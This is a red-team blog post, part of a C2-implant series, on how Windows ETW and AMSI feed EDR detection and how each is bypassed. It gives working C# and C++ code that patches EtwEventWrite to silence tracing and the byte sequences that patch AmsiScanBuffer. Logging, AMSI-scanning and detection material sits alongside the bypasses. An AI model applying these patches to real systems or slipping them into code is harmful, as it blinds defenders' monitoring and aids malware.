# https://pre.empt.blog/post/maelstrom-6/

![dev](https://pre.empt.blog/static/images/maelstrom-6-1.gif)

## Introduction

Last week we looked at three mechanisms which Event Detection and Response (EDR) programs can use to build suspicion and prevent the operation of a C2's implant. However there are mechanisms within Windows itself which can prevent the full function of a C2 implant, acting as a potent benefit to the defender and a worthy obstacle to the C2 operator.

As we mentioned last week, it can be surprisingly easy to get a functioning implant developed, and it can feel odd at times which behaviours and actions can be performed without issue and which invite undue attention. This is because not all actions are necessarily malicious and a defensive mechanism which prevents the use of the computer isn't helpful for productivity.

Over time, Microsoft has enhanced its built-in protections and opened these up to third party applications. EDR solutions are increasingly including these mechanisms and their telemetry, meaning that a contemporary C2 implant must either evade or negate these protections.

The second of two parts, this episode will look at two key Windows protections used by contemporary EDRs: ETW and AMSI.

### Objectives

This post will cover:

- Reviewing Event Tracing for Windows
- Where information is gathered
- How events can be manipulated
- How ETW TI can be evaded
- Reviewing Anti-Malware Scan Interface
- What detection looks like
- How AMSI has historically been bypassed
- How AMSI may continue to be bypassed

At the end of this second blog on endpoint protection, we will have looked at the five most prominent ways that modern EDRs can protect against malicious implants, and explored ways these protections can by bypassed. We will have gone from having an implant that can serve as a proof of concept with caveats to an implant which can act as part of our C2 and execute malicious traffic without detection.

To repeat the same caveat we have made in each of these blogs, the code from these posts is purely illustrative. There are thousands of potential detections and missteps which can pique an EDRs interest in an implant, and it would be remiss of us to release an implant without any flaws to the world. Plus, spaghetti code.

### Important Concepts

#### Event Tracing for Windows

Before we look at how Event Tracing for Windows (ETW) can be leveraged for its Threat Intelligence facilities, we should first look at ETW itself - what is it, how does it work, and what is it for.

First introduced with [Windows 2000](https://docs.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/event-tracing-for-windows-simplified), ETW was originally intended to offer detailed user and kernel logging which can be dynamically enabled or disabled without needing to restart the targeted process. This was originally and remains predominantly aimed at application debugging and optimisation. The early use of buffers and message queues, reminiscent of newer Web technologies such as [Apache Kafka](https://kafka.apache.org/), aims to limit the system impact of tracing (logging) sessions - helpful when trying to debug the system impact of your process itself.

The core structure of ETW has barely changed since Windows 2000, although the process of sending and receiving logs has been overhauled a number of times to make it easier for third-party programs to integrate with ETW.

[Microsoft's documentation](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing) describes the ETW architecture as the following:

> The Event Tracing API is broken into three distinct components:

- [Controllers](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#controllers), which start and stop an event tracing session and enable providers
- [Providers](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#providers), which provide the events
- [Consumers](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#consumers), which consume the events

![](https://pre.empt.blog/static/images/maelstrom-6-2.png)

Controllers are limited to users with admin rights, with some caveats.

Along-side the callbacks, Event Tracing for Windows Threat Intelligence provides tracing from the kernel and allows these traces to be consumed in various ways.

### Working with ETW

Within Windows, the `logman` binary exists which can be considered a Controller due to its functionality:

```plaintext

Verbs:
  create                        Create a new data collector.
  query                         Query data collector properties. If no name is given all data collectors are listed.
  start                         Start an existing data collector and set the begin time to manual.
  stop                          Stop an existing data collector and set the end time to manual.
  delete                        Delete an existing data collector.
  update                        Update an existing data collector's properties.
  import                        Import a data collector set from an XML file.
  export                        Export a data collector set to an XML file.
```

**The Providers**

There's a huge list of the default providers available; while [there are lists available](https://gist.github.com/guitarrapc/35a94b908bad677a7310) for these, we can just list all the providers on the systems with [logman](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/logman):

```plaintext

undefined
logman query providers
```

Running this will produce a long list of providers. We will focus on `Microsoft-Windows-DotNETRuntime` for now.

Running it again:

```plaintext

undefined
logman query providers Microsoft-Windows-DotNETRuntime
```

Resulting in:

![](https://pre.empt.blog/static/images/maelstrom-6-3.PNG)

Alternatively, for those more visually inclined, [EtwExplorer](https://github.com/zodiacon/EtwExplorer) by [Pavel Yosifovich (zodiacon)](https://github.com/zodiacon) was developed to explore ETW within a GUI.

Here is an example of the same provider from the logman query:

![](https://pre.empt.blog/static/images/maelstrom-6-4.PNG)

**Sample Code**

To play with ETW, we will try to detect a reflective `Assembly.Load` of a slim loader loading a proof-of-concept loadee executable:

The Loader:

```csharp

using System.Reflection;

namespace Loader
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Assembly assembly = Assembly.LoadFrom(@"C:\Users\mez0\Desktop\Loader\Example\bin\Debug\Example.exe");
            assembly.EntryPoint.Invoke(null, null);
        }
    }
}
```

Then our Loadee, "Example.exe", which we will compile and the loader will access via reflection:

```csharp

using System;

namespace Example
{
    internal class Program
    {
        static void Main()
        {
            Console.WriteLine("--> Hello From Example.exe <--");
        }
    }
}
```

The Loader will call `Assembly.LoadFrom` on the Loadee, which simply prints to the screen. When it runs, the Loadee is displayed:

![](https://pre.empt.blog/static/images/maelstrom-6-5.PNG)

**Configuring a Controller**

In order to see what ETW is doing, we need a controller to create, start, and stop our trace. For this, we can again use `logman`.

First, we create our trace, providing the name of our session ("`pre.empt.etw`") and the `-ets` flag which will send the commands directly to our event trace without scheduling or saving them:

```plaintext
logman create trace pre.empt.etw -ets
```

Running this should ideally return the following:

```plaintext
The command completed successfully.
```

With our trace created, we can now query it to get its status and configuration using the following command:

```plaintext
logman query pre.empt.etw -ets
```

This should return something like this:

![](https://pre.empt.blog/static/images/maelstrom-6-6.PNG)

Note the output location, which is based on the name of our created trace. We will need this to open our trace within Event Viewer:

```plaintext
C:\Users\mez0\pre.empt.etw.etl
```

Once that's done, our new provider can be added to the controller:

```plaintext
logman update pre.empt.etw -p Microsoft-Windows-DotNETRuntime 0x2038 -ets
```

`0x2038` is the bitmask of the events shown in [Detecting Malicious Use of .NET – Part 2](https://blog.f-secure.com/detecting-malicious-use-of-net-part-2/):

```plaintext
LoaderKeyword,JitKeyword,NGenKeyword,InteropKeyword
```

Querying it again:

![](https://pre.empt.blog/static/images/maelstrom-6-7.PNG)

Now that its setup, the assembly is run again and the `etl` file is opened in Event Viewer:

![](https://pre.empt.blog/static/images/maelstrom-6-8.PNG)

Where `EventId` 152 is:

```plaintext

LoaderModuleLoad
```

And then 145 (`MethodJittingStarted_V1`):

![](https://pre.empt.blog/static/images/maelstrom-6-9.PNG)

To stop this, just run:

```plaintext

logman stop pre.empt.etw -ets
```

**Tampering with ETW**

In [Hiding your .NET ETW](https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/) by [MDSec](https://www.mdsec.co.uk/), [xpn](https://twitter.com/_xpn_) states:

> To neuter this function we will use the same **ret 14h** opcode bytes of **c21400** and apply them to the beginning of the function

Then provides example code:

```cpp

// Get the EventWrite function
void *eventWrite = GetProcAddress(LoadLibraryA("ntdll"), "EtwEventWrite");

// Allow writing to page
VirtualProtect(eventWrite, 4, PAGE_EXECUTE_READWRITE, &oldProt);

// Patch with "ret 14" on x86
memcpy(eventWrite, "\xc2\x14\x00\x00", 4);

// Return memory to original protection
VirtualProtect(eventWrite, 4, oldProt, &oldOldProt);
```

Lets update the `Loader`:

```csharp

using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Loader
{
    internal class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        private static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        public static void PatchEtw()
        {
            IntPtr hNtdll = LoadLibrary("ntdll.dll");
            IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");

            byte[] patch = { 0xc3 };

            _ = VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, 0x40, out uint oldProtect);

            Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);

            _ = VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, oldProtect, out uint _);
        }

        private static void Main(string[] args)
        {
            Console.WriteLine("Inspect the AppDomains, then press any key...");
            Console.ReadLine();

            PatchEtw();

            Console.WriteLine("ETW is patched! Recheck then press any key...");
            Console.ReadLine();

            Assembly assembly = Assembly.LoadFrom(@"C:\Users\mez0\Desktop\Loader\Example\bin\Debug\Example.exe");
            assembly.EntryPoint.Invoke(null, null);
        }
    }
}
```

This has now been converted to a `x64` project, and the following function has been added:

```csharp

public static void PatchEtw()
{
    IntPtr hNtdll = LoadLibrary("ntdll.dll");
    IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");

    byte[] patch = { 0xc3 };

    _ = VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, 0x40, out uint oldProtect);

    Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);

    _ = VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, oldProtect, out uint _);
}
```

This follows the logic set out by xpn, and has a `0xc3`, `ret`, set on the `NTDLL!EtwEventWrite` instruction.

Before the patch:

![](https://pre.empt.blog/static/images/maelstrom-6-10.PNG)

Then after the patch:

![](https://pre.empt.blog/static/images/maelstrom-6-11.PNG)

So, the big question, does this matter to an actual ETW Event Tracing session?

Setting it back up:

![](https://pre.empt.blog/static/images/maelstrom-6-12.PNG)

The answer: _kinda_.

![](https://pre.empt.blog/static/images/maelstrom-6-13.PNG)

There is no reference to the Example.exe like there used to be. However, as the Loader first ran, _then_ patched ETW, there are obviously still events for it from before the patch:

![](https://pre.empt.blog/static/images/maelstrom-6-14.PNG)

When combined with other heuristics, this can still be enough to act as an indicator of compromise - for instance, an EDR which enabled ETW then identifies a sudden halt of events for a process could still flag this as suspicious if the process can still be seen to be running.

**Repairing ETW**

If memory is being patched, is probably best to un-patch it once its done with. In this instance, `0xc3` becomes `0x4c`:

```cpp

byte[] breakEtw = { 0xc3 };
byte[] repairEtw = { 0x4c };
```

This is easy enough, it's just a call to the same function with a different byte value. The next thing, in the case of .NET, is to unload the assembly. This is a bit more fiddly but is achievable. We were able to solve this using:

- [How to Load an Assembly to AppDomain with all references recursively?](https://stackoverflow.com/a/13355702)
- [.NET Reflection and Disposable AppDomains](https://rastamouse.me/net-reflection-and-disposable-appdomains/)

First thing, create an `AppDomain`:

```csharp

AppDomain appDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
```

Now, consider this from [Assembly.Load and FileNotFoundException](https://www.broes.nl/2012/09/assembly-load-and-filenotfoundexception/):

> AppDomain.Load returns an Assembly and that's where all goes wrong. Two AppDomains can't just throw stuff at each other. The entire reason AppDomains exist is to be able to "sandbox" certain functionality within one application. Communication between AppDomains happens (almost) transparently to the user (the programmer…) using channels and proxies, but not entirely. You need to be aware that you can either pass objects by value (they need to [implement **ISerialize** or be declared **Serializable**](http://msdn.microsoft.com/en-us/library/h8f0y3fc(VS.100).aspx)) to another AppDomain, or by reference, in which case the class needs to extend [MarshalByRefObj](http://msdn.microsoft.com/en-us/library/system.marshalbyrefobject(VS.100).aspx).

The proposed solution is to use a class which inherits from `MarshalByRefObject`:

```csharp

public class Proxy : MarshalByRefObject
{
    public Boolean InvokeAssembly(byte[] bytes)
    {
        try
        {
            Assembly assembly = Assembly.Load(bytes);
            assembly.EntryPoint.Invoke(null, null);
            return true;
        }
        catch (Exception)
        {
            return false;
        }
    }
}
```

Which can then be used to invoke the assembly from `bytes`:

```csharp

Proxy proxy = (Proxy)appDomain.CreateInstanceAndUnwrap(typeof(Proxy).Assembly.FullName, typeof(Proxy).FullName);
proxy.InvokeAssembly(File.ReadAllBytes(@"C:\Users\mez0\Desktop\Loader\Example\bin\x64\Debug\Example.exe"));
```

And then unload it:

```csharp

AppDomain.Unload(appDomain);
```

Before moving away from this topic, an honourable mention is: [Assembly.Lie – Using Transactional NTFS and API Hooking to Trick the CLR into Loading Your Code "From Disk"](https://blog.redxorblue.com/2021/05/assemblylie-using-transactional-ntfs.html). This will not be discussed here, but is worth considering if operating from a .NET C2.

#### ETW: Threat Intelligence

ETW provides a lot of tracing. However, there's a subsection of ETW that endpoint protection vendors take a lot of information from; namely solutions such as [Microsoft Defender for Identity](https://docs.microsoft.com/en-us/defender-for-identity/what-is) make heavy use of this, but it is: \*Event Tracing for Windows Threat Intelligence.

The following screenshot shows the capabilities of ETW TI:

![](https://pre.empt.blog/static/images/maelstrom-6-15.PNG)

Memory/process/thread manipulation, driver events, all sorts. As more and more vendors get around to implementing this, visibility into endpoint becomes a lot clearer.

This is a huge topic and we won't cover it here, so here are some great references:

- [Data Only Attack: Neutralizing EtwTi Provider](https://public.cnotools.studio/bring-your-own-vulnerable-kernel-driver-byovkd/exploits/data-only-attack-neutralizing-etwti-provider)
- [Introduction to Threat Intelligence ETW](https://undev.ninja/introduction-to-threat-intelligence-etw/)
- [Adventures in Dynamic Evasion](https://posts.specterops.io/adventures-in-dynamic-evasion-1fe0bac57aa)
- [Microsoft-Windows-Threat-Intelligence.xml](https://github.com/repnz/etw-providers-docs/blob/master/Manifests-Win10-17134/Microsoft-Windows-Threat-Intelligence.xml)
- [Detecting process injection with ETW](https://blog.redbluepurple.io/windows-security-research/kernel-tracing-injection-detection)
- [Bypassing EDR real-time injection detection logic](https://blog.redbluepurple.io/offensive-research/bypassing-injection-detection)

#### ETWTi identifying Process Injection

As an example, the following screenshot shows [PreEmpt](https://mez0.cc/projects/preempt/) detecting Maelstrom reflectively loading the DLL:

![](https://pre.empt.blog/static/images/maelstrom-6-16.png)

On the left, maelstrom was executed. Then, on the right, PreEmpt has received an even containing all the information on the impacted memory region. Below is the full JSON:

```json

{
  "data": {
    "allocation": "0x3000",
    "protectType": "0x1d0000",
    "protection": "0x40",
    "regionsize": "73728",
    "source_name": "C:\\Users\\admin\\Desktop\\maelstrom.unsafe.x64.exe",
    "source_pid": "9708"
  },
  "id": "cd27e5a5-df06-4859-96f0-d0b207d21ebf",
  "reason": "Malicious Activity Detected",
  "task": "EtwTi Process Injection",
  "time": "Tue May  3 19:34:33 2022"
}
```

#### Things to Consider

When working with an EDR that makes use of ETWTi, remember that memory alterations, process/thread creations, etc; will all be digested. However, not all events will create a prevention/action, but the information will be logged. This is why we avoid the Twitter trope of:

As shown in [Bypassing EDR real-time injection detection logic](https://blog.redbluepurple.io/offensive-research/bypassing-injection-detection), this logic _can_ be bypassed if the detection logic is weak. In the case of [DripLoader](https://blog.redbluepurple.io/offensive-research/bypassing-injection-detection#driploader), this bypasses detection by slowly adding more and more data to the region. As described in the blog, DripLoader avoids the ETWTi Memory Allocation alert by:

> - using the most risky APIs possible like `NtAllocateVirtualMemory` and `NtCreateThreadEx`
> - blending in with call arguments to create events that vendors are forced to drop or log\\&ignore due to volume
> - avoiding multi-event correlation by introducing delays

Finally, for defenders, this is clearly a valuable interface, and one which EDRs are increasingly seeking to include. While not all agents currently gather ETW TI, [mandiant's SilkETW](https://github.com/mandiant/SilkETW) is a quick way to include ETW within an ELK SOC.

### Antimalware Scan Interface (AMSI)

From [Antimalware Scan Interface (AMSI)](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal):

> The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any antimalware product that's present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads.
>
> AMSI is agnostic of antimalware vendor; it's designed to allow for the most common malware scanning and protection techniques provided by today's antimalware products that can be integrated into applications. It supports a calling structure allowing for file and memory or stream scanning, content source URL/IP reputation checks, and other techniques.

For context, here is a diagram of the AMSI Architecture:

![](https://pre.empt.blog/static/images/maelstrom-6-17.jpg)

With script-based malware, it can be easily obfuscated. However, AMSI allows developers to scan the final buffer because, eventually, the code must de-obfuscate. [How the Antimalware Scan Interface (AMSI) helps you defend against malware](https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps) details this process very well with multiple examples.

Essentially, AMSI is an interface exposed by Microsoft which allows developers to register a provider, and use the functionality exposed. Traditionally, a DLL would be registered as seen in [Developer audience, and sample code](https://docs.microsoft.com/en-us/windows/win32/amsi/dev-audience). As for the functions exposed:

| Function | Description |
| --- | --- |
| [**AmsiCloseSession**](https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiclosesession) | Close a session that was opened by [AmsiOpenSession](https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiopensession). |
| [**AmsiInitialize**](https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiinitialize) | Initialize the AMSI API. |
| [**AmsiNotifyOperation**](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsinotifyoperation) | Sends to the antimalware provider a notification of an arbitrary operation. |
| [**AmsiOpenSession**](https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiopensession) | Opens a session within which multiple scan requests can be correlated. |
| [**AmsiResultIsMalware**](https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiresultismalware) | Determines if the result of a scan indicates that the content should be blocked. |
| [**AmsiScanBuffer**](https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiscanbuffer) | Scans a buffer-full of content for malware. |
| [**AmsiScanString**](https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiscanstring) | Scans a string for malware. |
| [**AmsiUninitialize**](https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiuninitialize) | Remove the instance of the AMSI API that was originally opened by [AmsiInitialize](https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiinitialize). |

The benefit to this is that the detection logic is from Microsoft. Meaning a database of malware isn't required, and the provider can hook right into Microsoft's information.

#### AMSI Detection Example

Our sample tool Hunter has been updated to support AMSI and will be released at the end of this blog series.

AMSI is supported within the following namespace:

```cpp

#ifndef AMSISCANNER_H
#define AMSISCANNER_H
#include "pch.h"

namespace AmsiManager
{
    class Amsi
    {
    public:
        Amsi()
        {
            HRESULT hr = CoInitializeEx(0, COINIT_MULTITHREADED);
            if (hr != S_OK) {
                throw std::runtime_error("COM library failed to initialize");
            }
        }
        ~Amsi()
        {
            CoUninitialize();
        }

        void ScanWithAmsi()
        {
            AmsiManager::Amsi amsi = AmsiManager::Amsi();
            amsi.ScanMemory(_regions, _hProcess);
        }
    };
}
#endif
```

Following documentation, AMSI is initialised and a session created:

```cpp

ZeroMemory(&hAmsi, sizeof(hAmsi));
hr = AmsiInitialize(L"Hunter", &hAmsi);
if (hr != S_OK) {
    Errors::Show().print_hresult("AmsiInitialize", hr);
    return;
}

hr = AmsiOpenSession(hAmsi, &hSession);
if (hr != S_OK) {
    Errors::Show().print_hresult("AmsiOpenSession", hr);
    return;
}
```

Once it has been setup, the memory regions are looped over and passed into `AmsiScanBuffer`:

```cpp

for (MEMORY_BASIC_INFORMATION& mbi : regions)
{
    if (mbi.BaseAddress == nullptr)
    {
        continue;
    }
    if (mbi.Protect == PAGE_EXECUTE_READWRITE || mbi.Protect == PAGE_EXECUTE || mbi.Protect == PAGE_READWRITE)
    {
        std::vector buffer = ReadMemoryRegion(mbi, hProcess);
        if (buffer.empty())
        {
            continue;
        }
        hr = AmsiScanBuffer(hAmsi, buffer.data(), buffer.size(), NULL, hSession, &res);
        if (hr != S_OK) {
            Errors::Show().print_hresult("AmsiScanBuffer", hr);
            return;
        }
        if (res != AMSI_RESULT_CLEAN && res != AMSI_RESULT_NOT_DETECTED)
        {
            printf("  | AMSI Detection @ 0x%p: %s\n", mbi.BaseAddress, GetResultDescription(res));
        }
    }
}
```

However, this seemed to work intermittently; sometimes it would trigger, others it wouldn't. Lets move onto how AMSI is typically used.

#### AMSI Auto-Loading

In [What's new in .NET Framework](https://docs.microsoft.com/en-us/dotnet/framework/whats-new/) it states:

> **Antimalware scanning for all assemblies**. In previous versions of .NET Framework, the runtime scans all assemblies loaded from disk using either Windows Defender or third-party antimalware software. However, assemblies loaded from other sources, such as by the [Assembly.Load()](https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load#system-reflection-assembly-load(system-byte())) method, are not scanned and can potentially contain undetected malware. Starting with .NET Framework 4.8 running on Windows 10, the runtime triggers a scan by antimalware solutions that implement the [Antimalware Scan Interface (AMSI)](https://docs.microsoft.com/en-us/windows/desktop/AMSI/antimalware-scan-interface-portal).

This means that from .NET 4.8 onwards, AMSI was made apart of the framework. So, when an assembly is loaded, AMSI.DLL is too. This backdates .NET to 4.0 to provide support for AMSI.

If 4.8 is installed, then check the loaded modules. Here is a case for PowerShell:

![](https://pre.empt.blog/static/images/maelstrom-6-18.PNG)

The same thing will happen with a .NET assembly. This will be a significant consideration if the C2 in question is .NET and is relying on Assembly.Load to perform staging or post exploitation. With that said, there are alternatives to Assembly.Load that carry less risk by muting certain events. That will not be covered here, but see [SharpTransactedLoad](https://github.com/G0ldenGunSec/SharpTransactedLoad).

#### Historic AMSI Bypasses

Over the years, AMSI has had its problems with bypasses. Because of that, applications like [amsi.fail](https://amsi.fail/). Whether the C2 is in .NET, or the implant is able to host a CLR; then AMSI will need to be taken care of. As maelstrom is in neither of these sections, we can skim over some stuff here.

Most commonly, people currently tend to patch AMSI by overwriting the memory `AmsiScanBuffer`.

```csharp

var patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
```

This is documented in [Memory Patching AMSI Bypass](https://rastamouse.me/memory-patching-amsi-bypass/). In this example, the `HRESULT` is updated on the return:

```nasm

mov eax, 0x80070057
ret
```

In this example, `0x80070057` is [HRESULT](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/705fb797-2175-4a90-b5a3-3918024b10b8): `E_INVALIDARG`. So theoretically, this return can be any of those four:

| Error | Value | Bytecode |
| --- | --- | --- |
| `E_ACCESSDENIED` | `0x80070005` | `"\xB8\x05\x00\x07\x80\xC3"` |
| `E_HANDLE` | `0x80070006` | `"\xB8\x06\x00\x07\x80\xC3"` |
| `E_INVALIDARG` | `0x80070057` | `"\xB8\x57\x00\x07\x80\xC3"` |
| `E_OUTOFMEMORY` | `0x8007000E` | `"\xB8\x0E\x00\x07\x80\xC3"` |

However, there is a risk here. If the EDR in question is performing integrity checks on the memory region, then it will notice when it has been changed. In terms of code, its a simple calculation to make.

Assume the patch:

```csharp

var patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
```

This is 6 bytes long, so read the first 6 or so and store them. Check at some event (time, action, etc) whether the bytes match. Additionally, this could also be done with Kernel Callbacks, ETWTi for memory alterations within AMSI.DLL, and so on. So, the amount of possible detections for altering memory is fairly high. If patching memory is required, it is recommended to read the existing bytes, apply the patch, do something malicious, then reapply the original bytes to handle the integrity checks.

#### Future AMSI Bypasses

Something we have had a lot of success with is making use of [Hardware Breakpoints](https://ling.re/hardware-breakpoints/) and [Vectored Exception Handlers](https://docs.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling). This process was documented very well by [Ethical Chaos](https://twitter.com/_EthicalChaos_) in [In-Process Patchless AMSI Bypass](https://ethicalchaos.dev/2022/04/17/in-process-patchless-amsi-bypass/). Do remember, though, this is also detectable. A Proof-of-concept for this can be seen in this [gist](https://gist.github.com/olliencc/90f6e040dfef1dccb61f5b3fdc62fa00) where processes are scanned for breakpoints being set.

We are not going to demonstrate the use of this here, and is left as a task for the reader.

### Conclusion

This was a fairly long post given it's on just two native protections. We've tried to provide some clarity into the mechanisms EDRs can use to not only identify malicious activity, but prevent it. Along the way we've discussed common pitfalls and some enhancements that can be made to protect against the bypasses.

Whilst doing this, we've tried to shed more light onto the 'X bypasses EDR' narrative in which, yes, the implant might have comeback but there is likely logs of the activity. As with last week's blog, it is hard to stay completely off the radar of defensive mechanisms, and it's harder still to negate these protections without having the act of negating these protections getting logged. Ultimately, everything an operator can do, broadly speaking, _can_ be logged. It's up to the defender to ensure that these events are captured and linked in to their EDR, their SOC, and their awareness.

Next week we will go back to our implant with a look at improving its static opsec.